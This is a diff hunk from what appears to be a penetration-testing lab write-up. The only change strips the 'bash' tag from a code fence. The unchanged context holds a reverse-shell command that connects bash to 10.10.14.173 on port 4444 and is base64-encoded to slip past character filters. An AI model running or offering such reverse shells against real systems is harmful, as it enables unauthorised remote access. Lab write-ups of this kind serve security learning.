@@ -241,7 +241,7 @@ The reason we base64 the reverse shell is that certain characters are not allowe
 
 * encode the shell to base64
 
-```bash
+```
 echo "bash -c 'bash -i >& /dev/tcp/10.10.14.173/4444 0>&1'" | base64
 ```
 
